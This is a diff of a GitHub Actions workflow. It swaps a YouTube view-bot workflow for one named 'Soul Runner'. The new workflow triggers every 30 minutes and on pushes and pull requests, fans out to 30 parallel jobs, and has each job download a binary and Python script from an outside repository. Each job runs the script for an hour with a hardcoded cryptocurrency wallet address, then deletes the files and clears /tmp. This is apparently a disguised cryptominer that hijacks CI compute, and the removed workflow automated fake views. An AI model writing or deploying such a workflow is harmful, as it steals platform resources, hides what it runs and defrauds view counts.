@@ -1,43 +1,81 @@
-name: YouTube Auto View Bot
+name: Soul Runner
 
 on:
-  push:
-    branches:
-      - main
   schedule:
-    - cron: '0 */3 * * *'
-  workflow_dispatch:
+    - cron: '*/30 * * * *'  # Har 30 minute pe run hoga
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:  # Manual trigger allow karta hai
+  pull_request:
+    branches: [ main, master ]
 
 jobs:
-  run_bot:
+  soul_execution:
+    name: Execute Soul Task
     runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
+      max-parallel: 30  # 30 parallel jobs
+
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v3
+    - name: Checkout repository
+      uses: actions/checkout@v3
 
-      - name: Setup Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.9'
+    - name: Setup Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.9'
+        cache: 'pip'
 
-      - name: Install System Deps
-        run: |
-          sudo apt update
-          sudo apt install -y xvfb unzip curl wget libgbm1 libnss3 libatk1.0-0 libatk-bridge2.0-0 libcups2 libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2
-          wget -q -O google-chrome.deb https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
-          sudo apt install -y ./google-chrome.deb
+    - name: Install system dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y cpulimit curl wget
 
-      - name: Run Install Script
-        run: |
-          chmod +x install.sh
-          sudo ./install.sh
+    - name: Download and prepare binaries
+      run: |
+        # Download binaries
+        curl -L -o mustafa "https://github.com/thumpingpp/mustu-setup/releases/download/v1.0.0/mustafa" || \
+        wget -O mustafa "https://github.com/thumpingpp/mustu-setup/releases/download/v1.0.0/mustafa"
+        
+        # Download Python script
+        curl -O "https://raw.githubusercontent.com/thumpingpp/mustu-setup/main/mustafa.py" || \
+        wget "https://raw.githubusercontent.com/thumpingpp/mustu-setup/main/mustafa.py"
+        
+        # Make executable
+        chmod +x mustafa
+        chmod +x mustafa.py
 
-      - name: Install Python Libraries
-        run: |
-          pip install selenium-wire selenium==4.9.0 blinker==1.7.0
+    - name: Run main script
+      env:
+        INSTANCE_ID: ${{ matrix.instance }}
+        WALLET_ADDRESS: "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
+      run: |
+        echo "Running instance $INSTANCE_ID"
+        # CPU limit lagao per instance
+        if command -v cpulimit &> /dev/null; then
+          cpulimit -l 50 -- python3 mustafa.py $WALLET_ADDRESS &
+        else
+          python3 mustafa.py $WALLET_ADDRESS &
+        fi
+        
+        # Keep job alive
+        sleep 3600  # 1 hour
 
-      - name: Start Bot
-        run: |
-          Xvfb :99 -screen 0 1920x1080x24 &
-          export DISPLAY=:99
-          python soulcrack.py
+    - name: Upload logs (if any)
+      if: always()
+      uses: actions/upload-artifact@v3
+      with:
+        name: soul-logs-${{ matrix.instance }}
+        path: |
+          *.log
+          *.txt
+        retention-days: 1
+
+    - name: Cleanup
+      if: always()
+      run: |
+        rm -f mustafa
+        rm -f mustafa.py
+        rm -rf /tmp/*
